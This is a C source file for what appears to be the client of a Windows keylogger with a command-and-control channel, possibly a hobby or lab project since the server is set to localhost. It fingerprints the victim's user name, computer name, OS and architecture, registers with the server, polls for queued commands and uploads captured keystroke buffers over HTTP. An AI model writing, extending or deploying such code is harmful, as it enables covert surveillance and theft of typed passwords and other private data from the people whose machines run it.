
#include <stdio.h>

#include "client.h"


/**
 * Initialises the client structure, retrieves the username and computername
 * of the client and stores it as their ID. Then generates two and internet and 
 */
CLIENT_HANDLER* initClient() {
    CLIENT_HANDLER* client = (CLIENT_HANDLER *) malloc(sizeof(CLIENT_HANDLER));
    if (client == NULL) { return NULL; }

    memset(client->id, '\0', MAX_ID_LEN);
    memset(client->cmdBuffer, '\0', MAX_BUFF_LEN);

    // get the unique client ID as <user_name>-<compute_name>
    DWORD size = UNLEN + 1;
    char buffUser[size];
    if (!GetUserNameA(buffUser, &size)) { return NULL; }
    
    size = MAX_COMPUTERNAME_LENGTH + 1;
    char buffCompName[size];
    if (!GetComputerNameA(buffCompName, &size)) { return NULL; }  // failed to get computer name
    
    // initialise the client id, we can now register them with the server
    sprintf(client->id, "%s-%s", buffCompName, buffUser);
    
    // establish connection
    HINTERNET hSession = InternetOpenA("server", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession == NULL) { return NULL; }
    client->hSession = hSession;

    HINTERNET hConnect = InternetConnectA(hSession, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) { return NULL; }
    client->hConnect = hConnect;  // init client internet handle

    return client;
}


/**
 * Retrieev all cleint registration information and sent it to the server. 
 * The server responds with the random encoding key which is stored in the 
 * key logger
 */
ERR_CODE registerClient(CLIENT_HANDLER *client) {
    time_t seconds = getCurrentTime();

    OSVERSIONINFOA vInfo =  { 0 };   // gets version information
    vInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

    char version[32];
    if (!GetVersionExA(&vInfo)) {
        sprintf(version, "UNKNOWN-WIN-V");
    } else {
        sprintf(version, "WIN-%ld.%ld", vInfo.dwMajorVersion, vInfo.dwMinorVersion);
    }

    SYSTEM_INFO sInfo;   // get architecture information
    GetSystemInfo(&sInfo);

    char* arch = "UNKNOWN";   // PROCESSOR_ARCHITECTURE_UNKNOWN
    switch (sInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: arch = "AMD-INTEL"; break;
        case PROCESSOR_ARCHITECTURE_ARM:   arch = "ARM"; break;
        case PROCESSOR_ARCHITECTURE_ARM64: arch = "ARM64"; break;
        case PROCESSOR_ARCHITECTURE_IA64:  arch = "Intel-Itanium"; break;
        case PROCESSOR_ARCHITECTURE_INTEL: arch = "x86"; break;
    }

    // send the register data that includes system infomation!
    char registerStr[MAX_MSG_LEN];
    snprintf(registerStr, MAX_MSG_LEN, "/register?id=%s&os=%s&arch=%s&time=%lld", client->id, version, arch, seconds);

    // (ab)uses GET request to send os fingerprint
    HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL) { return ECODE_NULL; }

    // send the register request
    if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
        InternetCloseHandle(hRequest);
        return ECODE_GET;
    }

    DWORD bytesRead;  // read the key from the response
    unsigned char key[2];
    if (!InternetReadFile(hRequest, key, 1, &bytesRead) && bytesRead != 0) {  
        return ECODE_GET;
    }
    client->ENC_KEY = key[0];
    printf("\nSECRET: '%02X'\n", client->ENC_KEY);

    InternetCloseHandle(hRequest);
    return ECODE_SUCCESS;
}


/**
 * performs an HTTP GET request to the server to get all the this client queued commands!
 */
ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
    time_t seconds = getCurrentTime();
    char commandRequ[MAX_MSG_LEN];
    snprintf(commandRequ, MAX_MSG_LEN, "/commands?cid=%s&time=%lld", client->id, seconds);

    // set up the request
    HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", commandRequ, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL) { return ECODE_GET; }

    // send out the request
    if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
        InternetCloseHandle(hRequest);
        return ECODE_GET;
    }

    // read the commands into the command buffer!
    DWORD bytesRead;
    if (!InternetReadFile(hRequest, client->cmdBuffer, MAX_BUFF_LEN - 1, &bytesRead)) {
        return ECODE_GET;
    }
    client->cmdBuffer[bytesRead] = '\0';

    InternetCloseHandle(hRequest);
    return ECODE_SUCCESS;
}

/**
 * Write the client buffer to the servers logs. Afterwhich clear the buffer
 * Note: checking of buffer length is handled in program.c
 */
ERR_CODE writeKeyLog(CLIENT_HANDLER* client, const char* keyBuffer, const int bufferLen) {
    char logStr[MAX_MSG_LEN];
    snprintf(logStr, MAX_MSG_LEN, "/logs/%s", client->id);

    // send logs
    HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "POST", logStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL) { return ECODE_POST; }

    HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), (LPVOID)keyBuffer, bufferLen);
    InternetCloseHandle(hRequest);

    return ECODE_SUCCESS;
}

void clientCleanup(CLIENT_HANDLER *client) {
    if (client == NULL) { return; }

    // close internet handles
    if (client->hConnect != NULL) { InternetCloseHandle(client->hConnect); }
    if (client->hSession != NULL) { InternetCloseHandle(client->hSession); }
    
    free(client);
}